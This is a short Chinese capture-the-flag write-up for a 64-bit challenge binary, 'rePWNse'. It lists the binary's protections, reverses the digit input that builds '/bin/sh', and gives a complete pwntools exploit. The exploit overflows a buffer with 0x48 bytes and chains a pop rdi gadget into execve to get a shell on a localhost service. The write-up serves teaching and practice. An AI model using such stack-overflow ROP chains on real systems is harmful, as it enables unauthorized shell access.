# rePWNse

## 文件分析

下载`rePWNse`, NX on, PIE off, Canary off, RELRO full
ghidra分析为64位程序

## 逆向

`makebinsh`函数中有一个字母表和待输入的7位数字，易知else子句都是随机字母，难以组成目标；
而if子句和判断语句之外的cat语句可以组成目标，故得到2个等式和5个方程，整理得输入后的数组：

|idx|0|1|2|3|4|5|6|
|---|-|-|-|-|-|-|-|
|val|1|9|1|9|8|1|0|

~~这么臭的题还是不要罢~~

又发现存在`pop rdi; ret;` & `execve()`，回到了简单的ret2text

## EXPLOIT

```python
from pwn import *
sh = remote('localhost', 41053)
sh.sendline(b'1 9 1 9 8 1 0')
sh.recvuntil(b'is:') # skip
shstrAddr = int(sh.recvline()[2:9], 16)
popRdiAddr = 0x0040168e
execveAddr = 0x00401296
sh.sendline(b'0'*0x48 + p64(popRdiAddr) + p64(shstrAddr) + p64(execveAddr))
sh.interactive()
```

Done.
